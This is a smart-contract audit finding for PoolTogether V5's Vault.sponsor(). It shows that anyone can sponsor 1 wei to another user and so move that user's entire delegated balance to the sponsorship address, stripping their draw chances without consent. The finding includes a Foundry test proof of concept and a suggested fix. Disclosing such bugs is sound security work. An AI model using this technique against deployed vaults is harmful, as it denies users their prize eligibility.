# Original link
https://github.com/code-423n4/2023-07-pooltogether-findings/issues/204
# Lines of code

https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L480
https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L982
https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/TwabController.sol#L500


# Vulnerability details

## Impact

The [Vault.sponsor()](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L480) helps to delegate the user balance to the sponsorship address. As the [code comment](https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/TwabController.sol#L23) says: *@notice Allows users to revoke their chances to win by delegating to the sponsorship address.*.

The problem is that the function can be called using any `_receiver` in the parameter causing that all the `receiver` balance to move to the sponsorship address, even the balance that the `receiver` deposited previously.

Please see the next scenario:

1. Bob deposits 10e18 to the vault. Bob `balance` is 10e18 and `delegateBalance` is 10e18.
2. Malicious actor sponsors `1 wei` to Bob. The [sponsor function is executed](https://github.com/GenerationSoftware/pt-v5-vault/blob/b1deb5d494c25f885c34c83f014c8a855c5e2749/src/Vault.sol#L988) to the Bob receiver, so all [his balance is moved](https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/TwabController.sol#L501) to the `SPONSORSHIP_ADDRESS`. The [TwabController._delegate()](https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/TwabController.sol#L648C12-L648C21) function [moves all](https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/TwabController.sol#L660) the bob balance.
3. Since the delegated balance is moved to the `SPONSORSHIP_ADDRESS`, bob revoke without consent his chances to win in the draw contest.

Malicious actor can sponsor anyone making them  to revoke without consent his chances to win in the draw.

## Proof of Concept

I created a test where `alice the malicious actor` sponsors `1 wei` to `John` so all John previously balance plus the `1 wei` is moving to the `sponsorship address` causing John to revoke without consent his chances to win in the draw. Test steps:

1. Bob deposits `10e18` to the vault.
2. At the same time, John deposits to the vault `10e18`. Assert 10e18 amount in the john `balance` and `delegateBalance`.
3. Alice (Malicious actor) sponsors `1 wei` to John, so now John has `10e18 + 1 wei` in his `balance` but zero in his `delegateBalanceOf`.
4. Alice balance is 0 and John balance is the first deposit from the step 2 + the alice sponsor amount.
5. John balance is the deposited amount from the step 2 + the alice sponsor amount. John `delegateBalance` is zero because the amount was moved to the `sponsorship address`.
6. Bob balance is available by the [getTwabBetween()](https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/TwabController.sol#L258) balance, so he can participate in the draw contest.
7. John balance is `NOT available` by the [getTwabBetween()](https://github.com/GenerationSoftware/pt-v5-twab-controller/blob/0145eeac23301ee5338c659422dd6d69234f5d50/src/TwabController.sol#L258) because all his `delegateBalance` was moved to the sponsorship address. The John deposit from the step 2 was moved to the sponsorship address without consent.
8. Alice balance is `NOT avaialable` because she did not deposit to her account.

```solidity
// File: test/unit/Vault/Deposit.t.sol:VaultDepositTest
// $ forge test --match-test "testSponsorOnBehalfMovingAllTheBalance"

 function testSponsorOnBehalfMovingAllTheBalance() external {
    // Malicious actor can sponsor anyone causing that sponsored user the revoke of his chances to win
    // even if he has previous deposits.
    // 1. Bob deposits 10e18 to the vault.
    // 2. At the same time, John deposits to the vault 10e18. Assert 10e18 amount in the john balance and delegateBalance.
    // 3. Alice (Malicious actor) sponsors 1 wei to John, so now John has 10e18 + 1 wei in his balance but zero in his delegateBalanceOf
    // 4. Alice balance is 0 and John balance is the first deposit from the step 2 + the alice sponsor amount.
    // 5. John balance is the deposited amount from the step 2 + the alice sponsor amount.
    //    John delegateBalance is zero because the amount was moved to the sponsorship address.
    // 6. Bob balance is available by the getTwabBetween() balance, so he can participate in the draw contest
    // 7. John balance is NOT available by the getTwabBetween() because all his delegateBalance was
    //    moved to the sponsorship address. The John deposit from the step 2 was moved to the sponsorship address
    //    without consent.
    // 8. Alice balance is NOT avaialable because she did not deposit to her account.
    //
    address johnTheSponsored = address(1212);

    uint32 period_length = twabController.PERIOD_LENGTH();
    uint32 period_offset = twabController.PERIOD_OFFSET();

    uint32 initialTimestamp = period_offset + period_length;
    uint32 currentTimestamp = initialTimestamp + period_length;

    vm.warp(initialTimestamp);
    //
    // 1. Bob deposits 10e18 to the vault.
    //
    uint256 bobInitialDeposit = 10e18;
    vm.startPrank(bob);
    underlyingAsset.mint(bob, bobInitialDeposit);
    underlyingAsset.approve(address(vault), type(uint256).max);
    vault.deposit(bobInitialDeposit, bob);
    assertEq(twabController.balanceOf(address(vault), bob), bobInitialDeposit);
    assertEq(twabController.delegateBalanceOf(address(vault), bob), bobInitialDeposit);
    vm.stopPrank();
    //
    // 2. At the same time, John deposits to the vault 10e18. Assert 10e18 amount in the john balance and delegateBalance.
    //
    uint256 johnInitialDeposit = 10e18;
    vm.startPrank(johnTheSponsored);
    underlyingAsset.mint(johnTheSponsored, johnInitialDeposit);
    underlyingAsset.approve(address(vault), type(uint256).max);
    vault.deposit(johnInitialDeposit, johnTheSponsored);
    assertEq(twabController.balanceOf(address(vault), johnTheSponsored), johnInitialDeposit);
    assertEq(twabController.delegateBalanceOf(address(vault), johnTheSponsored), johnInitialDeposit);
    vm.stopPrank();
    //
    // 3. Alice (Malicious actor) sponsors 1 wei to John, so now John has 10e18 + 1 wei in his balance but zero in his delegateBalanceOf
    //
    vm.startPrank(alice);
    uint256 _amountAliceSponsor = 1 wei;
    underlyingAsset.mint(alice, _amountAliceSponsor);
    underlyingAsset.approve(address(vault), type(uint256).max);

    vm.expectEmit();
    emit Transfer(address(0), johnTheSponsored, _amountAliceSponsor);

    vm.expectEmit();
    emit Sponsor(alice, johnTheSponsored, _amountAliceSponsor, _amountAliceSponsor);
    vault.sponsor(_amountAliceSponsor, johnTheSponsored);
  
    vm.stopPrank();
    //
    // 4. Alice balance is 0 and John balance is the first deposit from the step 2 + the alice sponsor amount.
    //
    assertEq(vault.balanceOf(alice), 0);
    assertEq(vault.balanceOf(johnTheSponsored), _amountAliceSponsor + johnInitialDeposit);
    assertEq(twabController.balanceOf(address(vault), alice), 0);
    assertEq(twabController.delegateBalanceOf(address(vault), alice), 0);
    //
    // 5. John balance is the deposited amount from the step 2 + the alice sponsor amount.
    //    John delegateBalance is zero because the amount was moved to the sponsorship address.
    //
    assertEq(twabController.balanceOf(address(vault), johnTheSponsored), _amountAliceSponsor + johnInitialDeposit);
    assertEq(twabController.delegateBalanceOf(address(vault), johnTheSponsored), 0);
    assertEq(twabController.delegateOf(address(vault), johnTheSponsored), SPONSORSHIP_ADDRESS);

    // assert some general balances
    assertEq(twabController.balanceOf(address(vault), SPONSORSHIP_ADDRESS), 0);
    assertEq(twabController.delegateBalanceOf(address(vault), SPONSORSHIP_ADDRESS), 0);
    assertEq(underlyingAsset.balanceOf(address(yieldVault)), _amountAliceSponsor + bobInitialDeposit + johnInitialDeposit);
    assertEq(yieldVault.balanceOf(address(vault)), _amountAliceSponsor + bobInitialDeposit + johnInitialDeposit);
    assertEq(yieldVault.totalSupply(), _amountAliceSponsor + bobInitialDeposit + johnInitialDeposit);

    // Jump the time
    vm.warp(currentTimestamp);
    //
    // 6. Bob balance is available by the getTwabBetween() balance, so he can participate in the draw contest
    //
    uint256 bobBalance = twabController.getTwabBetween(
      address(vault),
      bob,
      initialTimestamp,
      initialTimestamp + 11
    );
    assertEq(bobBalance, 10e18);
    assertEq(twabController.getBalanceAt(address(vault), bob, currentTimestamp), 10e18);
    //
    // 7. John balance is NOT available by the getTwabBetween() because all his delegateBalance was
    // moved to the sponsorship address. The John deposit from the step 2 was moved to the sponsorship address
    // without consent
    //
    uint256 johnBalance = twabController.getTwabBetween(
      address(vault),
      johnTheSponsored,
      initialTimestamp,
      initialTimestamp + 11
    );
    assertEq(johnBalance, 0);
    assertEq(twabController.getBalanceAt(address(vault), johnTheSponsored, currentTimestamp), 0);
    //
    // 8. Alice balance is NOT avaialable because she did not deposit to her account.
    //
    uint256 aliceBalance = twabController.getTwabBetween(
      address(vault),
      alice,
      initialTimestamp,
      initialTimestamp + 11
    );
    assertEq(aliceBalance, 0);
    assertEq(twabController.getBalanceAt(address(vault), alice, currentTimestamp), 0);
  }
```

## Tools used

Manual review

## Recommended Mitigation Steps

The amount to the `SPONSORSHIP_ADDRESS` should be only the sponsored amount not all the previsouslty deposits of the sponsored user.


## Assessed type

Other